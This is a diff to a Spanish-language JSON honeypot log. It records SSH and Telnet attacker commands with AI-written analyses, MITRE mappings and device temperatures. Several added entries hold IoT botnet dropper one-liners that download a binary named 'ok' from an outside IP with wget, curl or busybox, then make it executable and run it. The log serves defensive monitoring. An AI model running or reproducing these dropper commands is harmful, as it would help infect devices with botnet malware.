@@ -1,65 +1,5 @@
 [
   {
-    "timestamp": "2026-09-08 10:13:10",
-    "ip_origen": "109.160.32.69",
-    "servicio": "SSH",
-    "comando": "uname -s -v -n -r -m",
-    "analisis": "Comando de reconocimiento clasico: recolecta informacion basica del sistema (kernel, arquitectura, hostname) para decidir que payload descargar despues.",
-    "mitre_technique": "T1082 - System Information Discovery",
-    "mitre_tactic": "Discovery",
-    "severidad": "Baja",
-    "temperatura": "40.6'C",
-    "throttled": "0x0"
-  },
-  {
-    "timestamp": "2026-09-08 10:13:12",
-    "ip_origen": "109.160.32.69",
-    "servicio": "SSH",
-    "comando": "uname -s -v -n -r -m",
-    "analisis": "[Repetido en menos de 60s - no se volvio a consultar a la IA]",
-    "mitre_technique": "N/A",
-    "mitre_tactic": "N/A",
-    "severidad": "N/A",
-    "temperatura": "40.0'C",
-    "throttled": "0x0"
-  },
-  {
-    "timestamp": "2026-09-08 10:13:15",
-    "ip_origen": "109.160.32.69",
-    "servicio": "SSH",
-    "comando": "uname -s -v -n -r -m",
-    "analisis": "[Repetido en menos de 60s - no se volvio a consultar a la IA]",
-    "mitre_technique": "N/A",
-    "mitre_tactic": "N/A",
-    "severidad": "N/A",
-    "temperatura": "40.0'C",
-    "throttled": "0x0"
-  },
-  {
-    "timestamp": "2026-09-08 10:13:18",
-    "ip_origen": "109.160.32.69",
-    "servicio": "SSH",
-    "comando": "uname -s -v -n -r -m",
-    "analisis": "[Repetido en menos de 60s - no se volvio a consultar a la IA]",
-    "mitre_technique": "N/A",
-    "mitre_tactic": "N/A",
-    "severidad": "N/A",
-    "temperatura": "40.6'C",
-    "throttled": "0x0"
-  },
-  {
-    "timestamp": "2026-09-08 10:13:20",
-    "ip_origen": "109.160.32.69",
-    "servicio": "SSH",
-    "comando": "uname -s -v -n -r -m",
-    "analisis": "[Repetido en menos de 60s - no se volvio a consultar a la IA]",
-    "mitre_technique": "N/A",
-    "mitre_tactic": "N/A",
-    "severidad": "N/A",
-    "temperatura": "41.1'C",
-    "throttled": "0x0"
-  },
-  {
     "timestamp": "2026-09-08 10:13:22",
     "ip_origen": "109.160.32.69",
     "servicio": "SSH",
@@ -11997,6 +11937,66 @@
     "mitre_tactic": "N/A",
     "severidad": "N/A",
     "temperatura": "35.1'C",
+    "throttled": "0x0"
+  },
+  {
+    "timestamp": "2026-09-08 13:21:37",
+    "ip_origen": "16.5.0.236",
+    "servicio": "Telnet",
+    "comando": "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &",
+    "analisis": "Patron de dropper: descarga un binario y lo hace ejecutable. Tecnica estandar de botnets IoT para instalar el payload final (miner, DDoS bot, etc.).",
+    "mitre_technique": "T1105 - Ingress Tool Transfer",
+    "mitre_tactic": "Execution",
+    "severidad": "Alta",
+    "temperatura": "31.8'C",
+    "throttled": "0x0"
+  },
+  {
+    "timestamp": "2026-09-08 13:21:40",
+    "ip_origen": "16.5.0.236",
+    "servicio": "Telnet",
+    "comando": "cd /tmp",
+    "analisis": "[ERROR consultando Claude: Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'Your credit balance is too low to access the Anthropic API. Please go to Plans & Billing to upgrade or purchase credits.'}, 'request_id': 'req_011CerH8r3ujCxbjN1eS1iaF'}]",
+    "mitre_technique": "N/A",
+    "mitre_tactic": "N/A",
+    "severidad": "N/A",
+    "temperatura": "33.4'C",
+    "throttled": "0x0"
+  },
+  {
+    "timestamp": "2026-09-08 13:21:44",
+    "ip_origen": "16.5.0.236",
+    "servicio": "Telnet",
+    "comando": "wget http://5.182.210.174/ok",
+    "analisis": "[ERROR consultando Claude: Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'Your credit balance is too low to access the Anthropic API. Please go to Plans & Billing to upgrade or purchase credits.'}, 'request_id': 'req_011CerH98hGxoErJ1K5FDJux'}]",
+    "mitre_technique": "N/A",
+    "mitre_tactic": "N/A",
+    "severidad": "N/A",
+    "temperatura": "32.9'C",
+    "throttled": "0x0"
+  },
+  {
+    "timestamp": "2026-09-08 13:21:46",
+    "ip_origen": "16.5.0.236",
+    "servicio": "Telnet",
+    "comando": "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/bin/wget http://5.182.210.174/ok;curl -O http://5.182.210.174/ok;busybox curl -O http://5.182.210.174/ok;chmod 777 ok;./ok;sh ok;busybox sh ok;rm -rf ok ok.1) >/dev/null 2>&1 &",
+    "analisis": "Patron de dropper: descarga un binario y lo hace ejecutable. Tecnica estandar de botnets IoT para instalar el payload final (miner, DDoS bot, etc.).",
+    "mitre_technique": "T1105 - Ingress Tool Transfer",
+    "mitre_tactic": "Execution",
+    "severidad": "Alta",
+    "temperatura": "32.9'C",
+    "throttled": "0x0"
+  },
+  {
+    "timestamp": "2026-09-08 13:21:48",
+    "ip_origen": "16.5.0.236",
+    "servicio": "Telnet",
+    "comando": "exit",
+    "analisis": "[ERROR consultando Claude: Error code: 400 - {'type': 'error', 'error': {'type': 'invalid_request_error', 'message': 'Your credit balance is too low to access the Anthropic API. Please go to Plans & Billing to upgrade or purchase credits.'}, 'request_id': 'req_011CerH9VFJ4RK4dAnGATo7M'}]",
+    "mitre_technique": "N/A",
+    "mitre_tactic": "N/A",
+    "severidad": "N/A",
+    "temperatura": "32.3'C",
     "throttled": "0x0"
   }
 ]
